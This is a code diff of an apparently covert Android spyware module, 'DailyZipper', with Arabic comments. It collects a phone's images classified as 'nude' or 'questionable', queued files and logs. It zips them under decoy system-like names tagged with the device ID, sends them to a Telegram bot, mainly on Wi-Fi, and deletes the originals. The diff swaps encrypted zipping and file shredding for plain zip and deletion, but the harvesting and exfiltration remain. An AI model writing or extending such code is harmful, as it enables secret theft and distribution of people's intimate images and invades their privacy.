@@ -6,9 +6,8 @@ import threading
 import logging
 import gc
 import string
-import shutil
 import json
-import hashlib
+import zipfile
 from datetime import datetime
 
 # ========== إعداد المسارات (متوافقة مع بقية الملفات) ==========
@@ -32,13 +31,6 @@ for d in [P, H, PENDING, QUEUE]:
 
 logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')
 
-# ========== المكتبات ==========
-try:
-    import pyzipper
-    HAS_PYZIP = True
-except ImportError:
-    HAS_PYZIP = False
-
 try:
     from jnius import autoclass
     JNI_AVAILABLE = True
@@ -50,11 +42,9 @@ class DailyZipper:
     def __init__(self, scanner=None, tg=None):
         self.sc = scanner
         self.tg = tg
-        self.pw = getattr(tg.m, 'pw', 'Zaen123@123@') if tg else 'Zaen123@123@'
+        # تم إزالة self.pw لأننا لم نعد نستخدم pyzipper
         self.max_b = 48 * 1024 * 1024   # 48MB (آمن تحت حد 50MB)
         self.active = False
-
-        # الحصول على معرف مختصر للجهاز (لتضمينه في اسم الملف المضغوط)
         self.device_tag = self._get_device_tag()
 
     def _get_device_tag(self):
@@ -68,8 +58,6 @@ class DailyZipper:
                 return aid[:8].lower()
         except:
             pass
-        # fallback: hash من نموذج الجهاز
-        import hashlib
         try:
             Build = autoclass('android.os.Build')
             model = f"{Build.MANUFACTURER} {Build.MODEL}"
@@ -77,37 +65,23 @@ class DailyZipper:
         except:
             return "unknown"
 
-    # ========== توليد اسم ملف وهمي ومعنّى (مع التاريخ ومعرف الجهاز) ==========
+    # ========== توليد اسم ملف وهمي ==========
     def _gen_name(self):
         prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
-        # إضافة التاريخ بصيغة YYMMDD
         date_str = datetime.now().strftime("%y%m%d")
-        # إضافة معرّف الجهاز المختصر
         tag = self.device_tag
-        # مقطع عشوائي
         chars = string.ascii_letters + string.digits
         suffix = ''.join(random.choices(chars, k=6))
         prefix = random.choice(prefixes)
-        # الاسم النهائي: مثلاً sys_upd_240521_a3f7_x9k2.zip
         return f"{prefix}{date_str}_{tag}_{suffix}.zip"
 
-    # ========== إتلاف الملف (كتابة عشوائية + حذف) مع تباطؤ ==========
-    def _shred(self, path):
+    # ========== حذف بسيط (بدون تدمير - مساحة التطبيق آمنة) ==========
+    def _delete_file(self, path):
         try:
             if os.path.exists(path):
-                sz = os.path.getsize(path)
-                if sz > 0:
-                    chunk = 4096
-                    with open(path, "ba+", buffering=0) as f:
-                        for _ in range(0, sz, chunk):
-                            f.write(os.urandom(min(chunk, sz)))
-                        f.flush()
-                        os.fsync(f.fileno())
                 os.remove(path)
-                # 🆕 تباطؤ صغير لتقليل استهلاك المعالج
-                time.sleep(0.1)
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"Delete error: {e}")
 
     # ========== التحقق من الاتصال عبر Wi-Fi ==========
     def _is_on_wifi(self):
@@ -138,7 +112,7 @@ class DailyZipper:
             time.sleep(delay)
         return False
 
-    # ========== الإرسال الفوري اليدوي (يتجاوز شرط WiFi) ==========
+    # ========== الإرسال الفوري اليدوي ==========
     def force_send_now(self, chat_id=None):
         if self.active:
             if chat_id:
@@ -162,14 +136,9 @@ class DailyZipper:
             self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً..."})
         threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()
 
-    # ========== الضغط والإرسال (داخلي) مع إنشاء ملف manifest ==========
+    # ========== الضغط والإرسال (باستخدام zipfile القياسي) ==========
     def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
         if not files or self.active:
-            return
-        if not HAS_PYZIP:
-            logging.error("pyzipper missing. Cannot encrypt.")
-            if report_id:
-                self.tg._api("sendMessage", {"chat_id": report_id, "text": "⚠️ pyzipper missing, cannot pack files."})
             return
         if not bypass_wifi and not self._is_on_wifi():
             logging.info("Not on WiFi, skipping automatic harvest.")
@@ -202,12 +171,11 @@ class DailyZipper:
             zip_path = os.path.join(H, zip_name)
 
             try:
-                # بناء بيانات manifest (تقرير المحتويات)
+                # بناء بيانات manifest
                 manifest_data = []
                 for f in batch:
                     fname = os.path.basename(f)
                     fsize = os.path.getsize(f) if os.path.exists(f) else 0
-                    # نحاول استنتاج تصنيف بسيط من نوع الملف أو اسمه (يمكن تحسينه لاحقاً)
                     ftype = "other"
                     if fname.lower().endswith(('.jpg','.jpeg','.png')):
                         ftype = "image"
@@ -222,22 +190,18 @@ class DailyZipper:
                         "timestamp": int(os.path.getmtime(f)) if os.path.exists(f) else 0
                     })
 
-                # إنشاء ملف manifest.json مؤقت
+                # إنشاء ملف المؤقت manifest (دون تشفير)
                 manifest_path = os.path.join(H, f"manifest_{int(time.time())}.json")
                 with open(manifest_path, 'w') as mf:
                     json.dump(manifest_data, mf, indent=2)
 
-                # إضافة الملفات وmanifest إلى الأرشيف المشفر
-                with pyzipper.AESZipFile(zip_path, 'w',
-                                         compression=pyzipper.ZIP_DEFLATED,
-                                         encryption=pyzipper.WZ_AES) as zf:
-                    zf.setpassword(self.pw.encode('utf-8'))
+                # إنشاء ZIP عادي (بدون تشفير) باستخدام zipfile
+                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                     for f in batch:
                         zf.write(f, os.path.basename(f))
-                    # إضافة ملف manifest داخل الأرشيف
                     zf.write(manifest_path, "manifest.json")
 
-                # حذف الملف المؤقت manifest
+                # حذف ملف manifest المؤقت
                 if os.path.exists(manifest_path):
                     os.remove(manifest_path)
 
@@ -246,7 +210,7 @@ class DailyZipper:
 
                 if success:
                     for f in batch:
-                        self._shred(f)
+                        self._delete_file(f)
                     if report_id:
                         self.tg._api("sendMessage", {"chat_id": report_id, "text": f"✅ تم إرسال الدفعة {idx+1} بنجاح"})
                 else:
@@ -261,7 +225,6 @@ class DailyZipper:
                 if os.path.exists(zip_path):
                     os.remove(zip_path)
 
-            # تأخير بين الدفعات لتجنب حظر Telegram
             if idx < len(batches) - 1:
                 time.sleep(5)
 
@@ -271,14 +234,13 @@ class DailyZipper:
         if report_id:
             self.tg._api("sendMessage", {"chat_id": report_id, "text": "🏁 انتهت عملية الإرسال الفوري."})
 
-    # ========== الحصاد التلقائي (يُستدعى من monitor) ==========
+    # ========== الحصاد التلقائي ==========
     def run(self):
         if self.active or not self._is_on_wifi():
             return
 
         all_files = []
 
-        # 1. جلب الملفات المصنفة من MediaScanner
         if self.sc:
             try:
                 for cat in ["nude", "questionable"]:
@@ -287,14 +249,12 @@ class DailyZipper:
             except Exception as e:
                 logging.error(f"Scanner error: {e}")
 
-        # 2. إضافة الملفات الموجودة في مجلد QUEUE (.cache_thumb)
         if os.path.exists(QUEUE):
             for f in os.listdir(QUEUE):
                 path = os.path.join(QUEUE, f)
                 if os.path.isfile(path):
                     all_files.append(path)
 
-        # 3. إضافة السجلات الكبيرة (>100KB)
         try:
             for f in os.listdir(P):
                 if f.endswith(".log") and f not in ["z.log", "t.log"]:
